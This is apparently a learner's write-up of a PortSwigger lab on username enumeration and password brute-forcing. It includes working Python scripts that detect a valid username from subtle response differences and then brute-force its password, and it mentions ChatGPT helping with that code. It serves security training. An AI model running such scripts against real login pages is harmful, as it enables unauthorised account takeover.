# Authentication vulnerabilities

This writeup covers the learning path *Authentication vulnerabilities* on Portswigger.

## What is Authentication

Authentication is the process of verifying the identity of a user. Authentication can be done in 3 ways:

- A user authenticates with *something the user knows*. Like a password or answer to a security question
- A user authenticates with *something they have*. This could be security token or authenticator device
- A user authenticates with *something they do or are*. This could biometrics or patterns of behavior.

Often more than one method is used, it then becomes multi-factor authentication.

## How do authentication vulnerabilities arise?

Authentication vulns commonly occur due to:

- Flawed brute force protection
- Logic flaws or poor coding allows an attacker to bypass the authentication

Authentication is always security critical, while logic flaws in other places on website might not pose a threat, it almost always does in authentication.

One big threat is an attacker gaining access to internal services which may not be protected in the same way as web facing services, allowing the attacker access to a larger attack surface.

## Vulnerabilities in password-based login

Brute force attacks are often used by attackers when only a password is required for authentication. Fortunately protection for brute force attemps do exist, not without flaws however.

During an audit it can be beneficial to view the HTTP requests to see if any usernames or emails are disclosed when browsing a site.

Passwords can be guessed using OSINT, common logic and human predicability. Users often try to conform a password into the policies enforced upon it, changing minor things like adding a `!`. If users have to change their password regularly, they will often make small predictable changes like going from `password! --> password?`.

Attackers can perform username generation by observing the websites behavior when signing up for a new account. If the response informs the attacker that the username is already taken, he can add that username to his list. Other beneficial approaches are:

- Status codes. Different status codes can indicate correct usernames or emails.
- Error messages. Sometimes error messages can differ if the username is correct (can be other cases too)
- Response times can be different when the username is correct, the backend often has to do a extra DB query or comparison of passwords taking more time to return a response. The difference in response time is probably very small.

## Lab: Username enumeration via subtly different responses

**Lab Description**:  This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

    Candidate usernames
    Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

### Lab solution

The list wordslists are found at: `https://portswigger.net/web-security/authentication/auth-lab-usernames` and `https://portswigger.net/web-security/authentication/auth-lab-passwords`

We will start with some recon, before writing a script using the wordlists to bruteforce the authentication.

Trying to log in with `carlos` and `1234` simply returns a message: `invalid username or password`. Looking at the network tab we dont receive much other information either.

For the script, i notice that the data is sent as a POST request with Form data to the `/login` endpoint.

From the lab text, we are told to enumerate a valid username, which argues that the response must be different for a login if the username is correct. My intuition tells me that the `<p>Invalid username or password</>` will change. To check for this I wrote a small python script. Another approach would be taking the entire reponse html and comparing the responses.

```python
import requests
from bs4 import BeautifulSoup

url = 'https://<someurl>.web-security-academy.net/login'

# Copy username wordlist to array
username_file = 'username_list.txt'
username_array = []

with open(username_file, 'r') as file:
    username_array = [line.strip() for line in file]

# Copy wordlist to array
password_file = 'password_list.txt'
password_array = []

with open(password_file, 'r') as file:
    password_array = [line.strip() for line in file]

responses = []
correct_responses = []

# Enumarate valid username
for username in username_array:
    # Define the form data payload
    payload = {
        'username': username,
        'password': '1234'
    }

    try:
        # Send the POST request
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            # print("Login successful!")
            # print("Response data:", response.text)
            soup = BeautifulSoup(response.text, 'html.parser')
            validity_message = soup.find('p', class_='is-warning')
            print(username, ": ", validity_message)
        else:
            print(f"Failed to log in. Status code: {response.status_code}")
            print("Response data:", response.text)
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)
```

Running the script does unfortunately not show anything of interest to begin with, as the change is very subtle. I did however input all of the responses in a diff checker and found one with an extra space in the end. So i decided on re-writing the script to find differences. Luckily ChatGPT supports bruteforcing and helped me with this bit `;)`

After finding the username with a difference in the response, the script goes through the password list and we hit a valid password for the user! `auction : moscow`.

```python
import requests
from bs4 import BeautifulSoup
import difflib

url = 'https://0a1c002104307b9e801d9e7400280094.web-security-academy.net/login'

# Copy username wordlist to array
username_file = 'username_list.txt'
username_array = []

with open(username_file, 'r') as file:
    username_array = [line.strip() for line in file]

# Copy wordlist to array
password_file = 'password_list.txt'
password_array = []

with open(password_file, 'r') as file:
    password_array = [line.strip() for line in file]

suspected_usernames = {}
# Enumarate valid username
for username in username_array:
    # Define the form data payload
    payload = {
        'username': username,
        'password': '1234'
    }

    try:
        # Send the POST request
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            # print("Login successful!")
            # print("Response data:", response.text)
            soup = BeautifulSoup(response.text, 'html.parser')
            validity_message = soup.find('p', class_='is-warning')
            suspected_usernames.update({username: validity_message.get_text()})
            # print(username, ": ", validity_message)
        else:
            print(f"Failed to log in. Status code: {response.status_code}")
            print("Response data:", response.text)
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

usernames_with_differences = []

def compare_to_baseline(strings):
    baseline = strings[0]
    print(f"Baseline: {baseline}\n")
    
    for i, string in enumerate(strings[1:], start=1):
        print(f"Comparing with string {i}: {string}")
        diff = difflib.ndiff(baseline, string)
        differences = [d for d in diff if d.startswith('+ ') or d.startswith('- ')]
        if differences:
            print(list(suspected_usernames.keys())[i])
            usernames_with_differences.append(list(suspected_usernames.keys())[i])
            print("Differences found:")
            print('\n'.join(differences))
        else:
            print("No differences.")
        print('-' * 40)


compare_to_baseline(list(suspected_usernames.values()))
    

for username in usernames_with_differences:
    for password in password_array:
        # Define the form data payload
        payload = {
            'username': username,
            'password': password
        }

        try:
            # Send the POST request
            response = requests.post(url, data=payload)

            if response.status_code == 200:
                print("Response data:", response.text)
                print(username, ": ", password)
            else:
                print(f"Failed to log in. Status code: {response.status_code}")
                print("Response data:", response.text)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", e)
```

This concludes the lab.

